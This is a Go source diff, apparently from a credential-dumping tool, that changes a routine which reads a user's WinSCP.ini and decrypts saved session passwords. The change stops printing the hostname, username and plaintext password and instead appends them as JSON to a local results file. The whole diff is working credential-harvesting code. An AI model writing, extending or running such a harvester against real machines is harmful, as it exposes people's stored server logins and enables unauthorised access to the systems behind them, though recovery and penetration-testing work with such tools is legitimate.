@@ -1,10 +1,10 @@
 package core
 
 import (
-	"fmt"
+	"encoding/json"
+	"os"
 	"os/user"
 	"strconv"
-	"strings"
 
 	"github.com/go-ini/ini"
 )
@@ -45,6 +45,10 @@ func GetWinSCPPasswords() {
 	decryptIni(defaultWinSCPIniFilePath())
 }
 
+type winSCP struct {
+	Hostname, Username, Password string
+}
+
 func defaultWinSCPIniFilePath() string {
 	usr, err := user.Current()
 	if err != nil {
@@ -58,14 +62,27 @@ func decryptIni(filepath string) {
 	if err != nil {
 		panic(err)
 	}
-
 	for _, c := range cfg.Sections() {
 		if c.HasKey("Password") {
-			fmt.Printf("%s\n", strings.TrimPrefix(c.Name(), "sessions\\"))
+			/*fmt.Printf("%s\n", strings.TrimPrefix(c.Name(), "sessions\\"))
 			fmt.Printf("  Hostname: %s\n", c.Key("HostName").Value())
 			fmt.Printf("  Username: %s\n", c.Key("UserName").Value())
 			fmt.Printf("  Password: %s\n", decryptWinSCP(c.Key("HostName").Value(), c.Key("UserName").Value(), c.Key("Password").Value()))
-			fmt.Println("========================")
+			fmt.Println("========================")*/
+			data := winSCP{
+				Hostname: c.Key("HostName").Value(),
+				Username: c.Key("UserName").Value(),
+				Password: decryptWinSCP(c.Key("HostName").Value(), c.Key("UserName").Value(), c.Key("Password").Value()),
+			}
+			file, _ := json.MarshalIndent(data, "", " ")
+			f, err := os.OpenFile("results/winscp_password.json", os.O_APPEND|os.O_WRONLY|os.O_CREATE, 0600)
+			if err != nil {
+				panic(err)
+			}
+			defer f.Close()
+			if _, err = f.Write(file); err != nil {
+				panic(err)
+			}
 		}
 	}
 
